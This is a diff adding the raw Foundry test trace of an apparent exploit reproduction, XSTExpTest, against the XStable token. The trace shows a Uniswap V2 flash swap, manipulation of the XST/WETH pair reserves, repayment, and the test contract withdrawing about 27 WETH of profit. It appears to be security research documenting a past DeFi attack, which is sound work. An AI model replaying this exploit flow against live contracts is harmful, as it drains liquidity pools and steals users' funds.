+    │   │   │   │   │   @ 0x1a670d8dd5e8e6b20e2134ca2c3f077cc605eda824aae5201b15d148921a9532: 0x0403101149430a113d0ea5bfc95dd865cb27dd7670b9aa47d7d26ab68906d0c6 → 0x27e8a02106b2939899fa14c78bf3811013110b54b54e586e0e8e1317ef023038
+    │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6941: 0x000000000000000000000000000000000000000000000000000599ad2de2d0b3 → 0x00000000000000000000000000000000000000000000000000015b81dc00d085
+    │   │   │   │   │   @ 11: 0xf8a960d260825b8fdb4f490e9d07821a6ab206fdb715f933be4f891152726d6f → 0xf84c1549c53ef44933c898f5fefafc28f3cddd34942e2a69fcda8fb9fa90059f
+    │   │   │   │   │   @ 12: 0x000000000000000000000000000000000000000000000000005422827ad57713 → 0x000000000000000000000000000000000000000000000000005402f1790961c3
+    │   │   │   │   │   @ 0x72df8701a157df1504c992cc381b2a2a15b3a6a12925db3f882ce3b1ee1fde0a: 0x00c16a781f0061ecd3ab0e5541faf6431b2cf3173bc88e78fd02ae0f8e299626 → 0x00f0103c6ca21590276e66619101393bd69f07fbcd3c75ddddbd2abb3a1aca0e
+    │   │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x2471815ca654a54d5125f072ffa48edbf2cbc3c19fdcc7aa32f45fbbca40295e → 0x00000000000000dbf8f079464ffc1d47788c5735a6ec63555a09415760712e34
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [504] UniswapV2Pair::getReserves() [staticcall]
+    │   │   │   └─ ← [Return] 375841716428802 [3.758e14], 116989676722055111610 [1.169e20], 1660075453 [1.66e9]
+    │   │   ├─ [40494] UniswapV2Pair::swap(0, 105290709049849600449 [1.052e20], XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x3030)
+    │   │   │   ├─ [23162] WETH9::transfer(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 105290709049849600449 [1.052e20])
+    │   │   │   │   ├─ emit Transfer(from: UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C], to: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 105290709049849600449 [1.052e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xea5dfa9b1f53a142bcd8a4323aad9ffbc282a9ede040128ec2dca6f5357b6940: 0x000000000000000000000000000000000000000000000006578ed3240de163ba → 0x000000000000000000000000000000000000000000000000a25b151d349689f9
+    │   │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0 → 0x000000000000000000000000000000000000000000000005b533be06d94ad9c1
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [1412] XSTExpTest::uniswapV2Call(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0, 105290709049849600449 [1.052e20], 0x3030)
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [2725] AdminUpgradeabilityProxy::fallback(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   ├─ [1949] XStable2::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 3800792872453095 [3.8e15]
+    │   │   │   │   └─ ← [Return] 3800792872453095 [3.8e15]
+    │   │   │   ├─ [534] WETH9::balanceOf(UniswapV2Pair: [0x694f8F9E0ec188f528d6354fdd0e47DcA79B6f2C]) [staticcall]
+    │   │   │   │   └─ ← [Return] 11698967672205511161 [1.169e19]
+    │   │   │   ├─ emit Sync(reserve0: 3800792872453095 [3.8e15], reserve1: 11698967672205511161 [1.169e19])
+    │   │   │   ├─ emit Swap(sender: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 3424951156024293 [3.424e15], amount1In: 0, amount0Out: 0, amount1Out: 105290709049849600449 [1.052e20], to: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 8: 0x62f2bdbd000000000006578ed3240de163ba000000000000000155d377ffe002 → 0x62f2bdbd000000000000a25b151d349689f9000000000000000d80cd0d0703e7
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [534] WETH9::balanceOf(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 105290709049849600449 [1.052e20]
+    │   │   ├─ [0] console::log("my weth balance: %s", 105290709049849600449 [1.052e20]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [0] console::log("Refund %s:", 78305090285962221370 [7.83e19]) [staticcall]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3262] WETH9::transfer(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852, 78305090285962221370 [7.83e19])
+    │   │   │   ├─ emit Transfer(from: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852, value: 78305090285962221370 [7.83e19])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x000000000000000000000000000000000000000000000005b533be06d94ad9c1 → 0x00000000000000000000000000000000000000000000000176802d4a319f8287
+    │   │   │   │   @ 0xaced72359d8708e95d2112ba70e71fa267967a5588d15e7c78c1904e0debe410: 0x00000000000000000000000000000000000000000000021977fd6808a4d47add → 0x00000000000000000000000000000000000000000000021db6b0f8c54c7fd217
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WETH9::balanceOf(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852) [staticcall]
+    │   │   └─ ← [Return] 9992852839113947075095 [9.992e21]
+    │   ├─ [5031] TetherToken::balanceOf(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852) [staticcall]
+    │   │   └─ ← [Return] 16873299927659 [1.687e13]
+    │   ├─ emit Sync(reserve0: 9992852839113947075095 [9.992e21], reserve1: 16873299927659 [1.687e13])
+    │   ├─ emit Swap(sender: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 78305090285962221370 [7.83e19], amount1In: 0, amount0Out: 77993117814703407740 [7.799e19], amount1Out: 0, to: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─  storage changes:
+    │   │   @ 8: 0x62f2bd8800000000000000000f589f0c626b00000000021db25c9f76036abd59 → 0x62f2bdbd00000000000000000f589f0c626b00000000021db6b0f8c54c7fd217
+    │   │   @ 9: 0x00000000000000000000000000000000000023dda58569569ab864ab0ccc88e0 → 0x00000000000000000000000000000000000023dda705ca66b1d96d1e1197d5e7
+    │   │   @ 10: 0x00000000000000000000011d3033268bbe552814b7556099f34518c80e665f9d → 0x00000000000000000000011d303a755d86f30e5619203a3987dff4dbb4240991
+    │   └─ ← [Stop]
+    ├─ [534] WETH9::balanceOf(XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 26985618763887379079 [2.698e19]
+    ├─ [0] console::log("now my weth num: %s", 26) [staticcall]
+    │   └─ ← [Stop]
+    ├─ [9181] WETH9::withdraw(26985618763887379079 [2.698e19])
+    │   ├─ [41] XSTExpTest::fallback{value: 26985618763887379079}()
+    │   │   └─ ← [Stop]
+    │   ├─ emit Withdrawal(src: XSTExpTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], wad: 26985618763887379079 [2.698e19])
+    │   ├─  storage changes:
+    │   │   @ 0x1da434b76eba4736d6e760bfd78cbf883a0776ee1666a9157f99ab1b97923a3c: 0x00000000000000000000000000000000000000000000000176802d4a319f8287 → 0
+    │   └─ ← [Stop]
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 12.73s (11.41s CPU time)
+
+Ran 1 test suite in 21.60s (12.73s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
